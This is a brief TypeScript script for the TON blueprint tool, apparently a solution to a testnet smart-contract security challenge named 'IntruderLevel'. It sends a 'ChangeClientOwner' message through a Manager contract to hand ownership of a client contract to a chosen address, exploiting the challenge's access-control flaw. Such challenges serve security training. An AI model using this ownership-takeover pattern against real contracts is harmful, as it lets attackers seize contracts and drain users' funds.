import { Manager } from '../wrappers/wrappers/Manager';

import { Address, toNano } from '@ton/core';
import { NetworkProvider } from '@ton/blueprint';

// yarn blueprint run 4.IntruderLevel --testnet --mnemonic
export async function run(provider: NetworkProvider) {
    const manager = provider.open(
        Manager.fromAddress(Address.parse('kQDMIs_EzkCvh_Qo6PWmzWzv3kxW3Kqj1Z2q2VwzjLDMepqz')),
    );

    await manager.send(
        provider.sender(),
        { value: toNano('0.1') },
        { $$type: 'ChangeClientOwner', newOwner: Address.parse('EQCfWnJsn6EObZIpyynLFgEI__C5qX4l_WsiaokAZuDW7VK5') },
    );
}
